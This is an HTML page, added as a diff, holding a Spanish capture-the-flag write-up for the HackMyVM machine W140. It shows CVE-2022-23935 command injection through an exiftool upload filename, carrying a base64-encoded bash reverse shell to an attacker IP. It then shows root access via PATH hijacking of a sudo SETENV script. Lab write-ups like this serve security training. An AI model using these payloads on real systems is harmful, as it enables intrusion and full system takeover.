@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>    
+    <meta property="og:title" content="✍ HackMyVM - W140 " />
+    <meta property="og:description" content="Creador - Powerfull" />
+    
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/hmv/w140" />
+    <meta property="og:url" content="https://0x-noname.github.io/writeups/hmv" /> 
+    
+    <meta property="og:image" content="https://0x-noname.github.io/assets/img/hmv_w140/w140_logo.png" />
+    <meta property="og:type" content="website" />
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HackMyVm - W140</title>
+    <link rel="shortcut icon" href="../../assets/img/favicon.ico">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
+    <link rel="stylesheet" href="../../assets/css/prism.css">
+    <link rel="stylesheet" href="../../assets/css/writeups.css">  
+</head>
+<body>
+    <header>
+        <nav class="nav">
+            <a href="../../index">$ home</a>
+            <a href="/#">$ whoami</a>
+        </nav>
+    </header>
+    <main class="main">
+        <h1>Red Team & Ctf Pl4yer</h1>
+        <h2>HackMyVm - W140</h2>
+            <p class="autor">Autor:&nbsp;<code class="code_autor_hmv">Powerfull</code></p>
+            <img class="img_hmv" src="../../assets/img/hmv_w140/w140_logo.png" alt="colors">
+            <h3>Escaneo de puertos</h3>
+            <pre class="pre">
+<code class="code language-txt">❯ nmap -p- -T5 -v -n 192.168.1.15
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre>
+            <h3>Escaneo de servicios</h3>
+            <pre class="pre">
+<code class="language-txt">❯ nmap -sVC -p 22,80 192.168.1.15
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 fffdb20f38881a44c42b642cd297f68d (RSA)
+|   256 ca5054f7244ea7f10646e72230ec95b7 (ECDSA)
+|_  256 0968c062831ef15dcb29a65eb472aacf (ED25519)
+80/tcp open  http    Apache httpd 2.4.54 ((Debian))
+|_http-title: w140
+|_http-server-header: Apache/2.4.54 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+            <h3>HTTP</h3>
+            <p>Compruebo el menu de navegación y encuentro<code class="code_negrita">&nbsp;service.html</code>.</p>
+            <img class="img_b" src="../../assets/img/hmv_w140/httpservice.png" alt="httpservice">
+
+            
+            
+            <p>En<code class="code_negrita">&nbsp;service.html&nbsp;</code>hay una herramienta para subir archivos.</p>
+            <img class="img_b" src="../../assets/img/hmv_w140/httpuploader.png" alt="httpuploader">
+
+            <p>Si intento subir un archivo<code class="code_negrita">&nbsp;php&nbsp;</code>me muestra el siguiente error:</p>
+            <img class="img_b" src="../../assets/img/hmv_w140/filtroUploader.png" alt="filtroUploader">
+
+            <p>Subo una imagen con extensión<code class="code_negrita">&nbsp;JPEG&nbsp;</code>al subir la foto la convierte en texto.</p>
+            <img class="img_m" src="../../assets/img/hmv_w140/txtexiftool.png" alt="txtexiftool">
+
+            <h3>CVE-2022-23935</h3>
+            <pre class="pre"><code class="language-txt">https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429
+</code></pre>
+            <p>Si el nombre de archivo pasado a exiftool termina con un carácter de tubería<code class="code_negrita">&nbsp;|&nbsp;</code>y existe en el sistema de archivos, el archivo se tratará como una tubería y se ejecutará como un comando del sistema operativo.</p>
+
+            <h3>BurpSuite</h3>
+            <p>Con burp subo la imagen para modificar el <code class="code_negrita">&nbsp;filename&nbsp;</code>ya que este es el que se tiene que usar para hacer la inyección de comandos, pero antes de nada hay que codificar la shell para que funcione bien.</p>
+<pre class="pre">
+<code class="language-txt">❯ echo -n "bash -i >& /dev/tcp/192.168.1.14/1337 0>&1" | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTQvMTMzNyAwPiYx
+</code></pre>
+<img class="img_b" src="../../assets/img/hmv_w140/burpsuite.png" alt="burpsuite">
+<pre class="pre"><code class="language-txt">echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTQvMTMzNyAwPiYx' | base64 -d | bash |
+</code></pre><br>
+
+
+
+            <p>Una vez obtengo la shell me muevo al directorio <code class="code_negrita">&nbsp;/var/www&nbsp;</code>en este hay el archivo oculto llamado <code class="code_negrita">&nbsp;.w140.png&nbsp;</code>si lo abrimos contiene un qr con las credenciales de acceso del usuario ghost, para leer el qr yo suelo usar esta web:</p>
+<pre class="pre"><code class="language-txt">https://online-barcode-reader.inliteresearch.com/
+</code></pre>
+
+            <h3>r00t</h3>
+            <p>El usuario ghost tiene permisos para cambiar variables de entorno al lanzar<code class="code_negrita">&nbsp;/opt/Benz-w140</code>.</p>
+<pre class="pre"><code class="language-txt">ghost@w140:~$ sudo -l
+User ghost may run the following commands on w140:
+    (root) SETENV: NOPASSWD: /opt/Benz-w140
+</code></pre>
+
+            <p>Archivo Benz-w140.</p>
+<pre class="pre"><code class="language-bash">ghost@w140:/opt$ cat Benz-w140 
+
+#!/bin/bash
+. /opt/.bashre
+cd /home/ghost/w140      
+
+# clean up log files
+if [ -s log/w140.log ] && ! [ -L log/w140.log ]
+then
+/bin/cat log/w140.log > log/w140.log.old
+/usr/bin/truncate -s@ log/w140.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+</code></pre>
+
+            <p>Al final del script hay el comando find, este no usa la ruta absoluta y podemos abusar de esto para conseguir el root.</p>
+<pre class="pre"><code class="language-bash">ghost@w140:~$ cd /tmp
+ghost@w140:/tmp$ touch find
+ghost@w140:/tmp$ echo "bash" > find
+ghost@w140:/tmp$ chmod +x find
+</code></pre>
+            <p>Path Hijacking</p>
+<pre class="pre"><code class="language-bash">ghost@w140:/tmp$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games 
+ghost@w140:/tmp$ sudo PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games /opt/Benz-w140
+root@w140:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+            <p>Y hasta aquí la máquina w140, la primera máquina del sr Powerfull.</p>
+
+    </main>
+        <footer class="footer">
+            <a class="a_footer" href="https://github.com/0x-noname" target="_blank"># noname &copy; 2023<i class="i_footer bi bi-github"></i></a>
+            <script src="../../assets/js/prism.js"></script> 
+
+        </footer>  
+</body>
+</html>
